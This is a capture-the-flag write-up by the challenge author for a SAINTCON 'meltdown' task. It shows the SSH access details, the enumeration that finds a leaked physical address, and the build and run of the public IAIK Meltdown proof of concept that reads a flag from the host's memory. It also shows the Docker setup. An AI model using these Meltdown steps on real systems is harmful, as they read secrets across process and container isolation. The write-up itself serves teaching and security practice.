
# Hint

```
I'll stop the world and melt with you.

https://www.youtube.com/watch?v=LuN6gs0AJls
https://genius.com/Modern-english-i-melt-with-you-lyrics

host: 208.71.143.18
protocol: ssh
port: 1337
user: rigel
password: dontmeltme
```

# additional hints

These "hints" were added after the contest started.

```
Brute forcing all of memory for meltdown will take longer than the con lasts. Dont' do it.

Don't leave processes running for more than a minute or so.

(and clean up after yourself, please =)
```

# solution

The goal of this challenge is to exploit the meltdown vulnerability
to recover a key stored in another container (actually the root host).
I wasn't subtle about what the vulnerability was (title of the
challenge was "meltdown" afterall), but the question is really
where is the key?

Well, when you're given ssh access to a host, you should -always- go
poking around and see what's there.

```
$ ssh [ipaddress] -l rigel -p [port num]
rigel@nyx.home's password:
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Oct 28 11:44:27 MDT 2019

  System load:  2.0                Processes:              161
  Usage of /:   0.6% of 436.15GB   Users logged in:        0
  Memory usage: 0%                 IP address for eth1:    172.16.0.17
  Swap usage:   0%                 IP address for docker0: 172.17.0.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

203 packages can be updated.
149 updates are security updates.

Last login: Mon Oct 28 11:44:27 2019 from ec2-3-93-103-205.compute-1.amazonaws.com
rigel@bf1593ce9345:~$ who
rigel@bf1593ce9345:~$ find .
.
rigel@bf1593ce9345:~$ id -a
uid=1001(rigel) gid=1001(rigel) groups=1001(rigel)
rigel@bf1593ce9345:~$ tail /etc/passwd
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
jason:x:1000:1000:Jason Wright,,,:/home/jason:/bin/bash
rigel:x:1001:1001::/home/rigel:/bin/dosh
```

Ok, so there's nothing in our own home directory, but there is another user
called "jason".

```
rigel@bf1593ce9345:~$ find ~jason
/home/jason
/home/jason/.bash_history
rigel@bf1593ce9345:~$ cat ~jason/.bash_history
sudo taskset 1 ./secret > /tmp/testing
rigel@bf1593ce9345:~$ cat /tmp/testing
[+] Physical address of secret: 0x7f9aa69a0
[+] Exit with Ctrl+C if you are done reading the secret
```

Ah hah! It seems "jason" was experimenting with the meltdown vulnerability,
and it seems the secret might be at physical address 0x7f9aa69a0 (note:
the actual address changes each time I boot the host OS, but I ensure that
the `/tmp/testing` file is accurate.

```
rigel@bf1593ce9345:~$ git clone https://github.com/IAIK/meltdown.git
Cloning into 'meltdown'...
remote: Enumerating objects: 4, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 292 (delta 0), reused 1 (delta 0), pack-reused 288
Receiving objects: 100% (292/292), 30.43 MiB | 1.32 MiB/s, done.
Resolving deltas: 100% (161/161), done.
rigel@bf1593ce9345:~$ cd meltdown
rigel@bf1593ce9345:~/meltdown$ taskset 1 ./physical_reader 0x7f9aa69a0
[+] Physical address       : 0x7f9aa69a0
[+] Physical offset        : 0xffff880000000000
[+] Reading virtual address: 0xffff8807f9aa69a0

^C
```

Well, that didn't work (sometimes it does, but usually not). Buried in the README for
meltdown is the text "It just does not work on my computer". Most of the suggestions
are not viable given the level of access you have (i.e. you're not disabling hyperthreads
in the BIOS, etc.). But, one says:

"""
Use a different variant of Meltdown. This can be changed in libkdump/libkdump.c in the line #define MELTDOWN meltdown_nonull. Try for example meltdown instead of meltdown_nonull, which works a lot better on some machines (but not at all on others).
"""

On this particular machine, setting MELTDOWN to meltdown works well.

```
rigel@bf1593ce9345:~/meltdown$ vi libkdump/libkdump.c
rigel@bf1593ce9345:~/meltdown$ make
...
rigel@bf1593ce9345:~/meltdown$ taskset 1 ./physical_reader 0x7f9aa69a0
[+] Physical address       : 0x7f9aa69a0
[+] Physical offset        : 0xffff880000000000
[+] Reading virtual address: 0xffff8807f9aa69a0

ctf{yougotyourspectreinmymeltdown}

^C

# common errors

I found several folks trying to use `memdump` from the meltdown archives to dump all of
physical memory. That's effective (maybe), but would take longer than the 3.5 days of saintcon,
and you'd still need to find the key in the dump you retrieved.

Several folks left out the "taskset" part of the command line. It matters: only cpu core 1
has the key forced into the cache. The other 7 cores may or may not (most likely not) have the
physical address in cache.

# setting up the challenge

This is the behind the scenes of how the challenge was configured.

On the host, I ran
a modified version of the meltdown "secret" program. The only real modification was to
read the secret from a file and to fflush() it's output after it printed the physical
address information. This program runs as root on the host (it needs access to
`/proc/$pid/pagemap` to compute the physical address of the key). After printing the
location, it sets in a busy loop constantly reading the memory address (which forces
it to stay resident in the cache).

Users were allowed to `ssh` into the machine... ok, not really, the "rigel" user has
a shell of "dosh" which looks like:

```
#!/bin/bash
sudo /bin/shell2docker
```

(note: /bin/dosh was added to `/etc/shells` too)

And `/bin/shell2docker` looks like:

```
#!/bin/bash
if [ $SUDO_USER ]; then
  username=$SUDO_USER
else
  username=$(whoami)
fi
uid="$(id -u $username)"
gid="$(id -g $username)"
docker run --rm -it \
  -u $uid:$gid -it \
  --cap-drop=all \
  -v /etc/passwd:/etc/passwd:ro \
  -v /etc/group:/etc/group:ro \
  hello
```

This dumps the user into a temporary (--rm) docker container with the priviledges of the
"rigel" user. The docker container name is the descriptively named "hello" container.
It's dockerfile looks like:

```
FROM ubuntu
WORKDIR /home/rigel

RUN apt-get update; apt-get -y install build-essential git-core
RUN apt-get -y install \
    nano \
    screen \
    tmux \
    vim

COPY testing /tmp/testing
RUN chown 1000:1000 /tmp/testing
RUN chmod 644 /tmp/testing
RUN install -d -o 1000 -g 1000 -m 755 /home/jason
COPY bash_history /home/jason/.bash_history
RUN chown 1000:1000 /home/jason/.bash_history
RUN chmod 644 /home/jason/.bash_history
RUN chown 1001:1001 /home/rigel

CMD ["/bin/bash", "-l", "-i"]
```

This container is rebuilt each time the machine boots (after secret is running) to
include the new `/tmp/testing` file.

# author

This challenge and walkthrough was created by Jason L. Wright
[jason@thought.net](mailto:jason@thought.net),
[@risenrigel](https://twitter.com/risenrigel)
